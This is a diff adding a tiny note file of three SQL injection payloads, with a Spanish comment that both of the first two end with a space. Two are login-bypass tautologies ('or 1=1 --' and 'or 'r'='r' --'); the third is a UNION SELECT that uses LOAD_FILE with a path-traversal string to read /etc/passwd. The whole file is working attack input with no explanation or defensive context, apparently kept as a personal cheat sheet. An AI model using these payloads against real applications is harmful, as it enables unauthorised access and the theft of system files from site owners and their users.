@@ -1,0 +1,5 @@
+ "' or 1=1 -- " 
+
+ ' or 'r' = 'r' --         #Al final ambas llevan espacio
+
+ ' union select null, null, LOAD_FILE('../../../../../etc/passwd') AS username, null,null--
